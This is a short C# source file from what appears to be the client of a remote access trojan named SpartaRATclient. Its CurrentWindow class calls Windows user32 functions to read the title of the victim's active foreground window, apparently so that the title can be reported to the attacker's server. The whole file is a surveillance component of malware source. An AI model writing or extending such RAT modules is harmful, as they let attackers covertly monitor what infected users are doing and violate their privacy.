using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient.Tools
{
    public class CurrentWindow
    {
        Server server;
        public CurrentWindow(Server server) 
        {
            this.server = server;
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, StringBuilder lParam);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        public String OpenWindow()
        {
            const int WM_GETTEXT = 0x000D;
            const int WM_GETTEXTLENGTH = 0x000E;

            IntPtr foregroundWindowHandle = GetForegroundWindow();
            int windowTextLength = (int)SendMessage(foregroundWindowHandle, WM_GETTEXTLENGTH, 0, new StringBuilder());

            if (windowTextLength > 0)
            {
                StringBuilder windowText = new StringBuilder(windowTextLength + 1);
                SendMessage(foregroundWindowHandle, WM_GETTEXT, windowText.Capacity, windowText);

                string windowTitle = windowText.ToString();
                return windowTitle;
            }
            else
            {
                return "no found";
            }
        }
    }
}
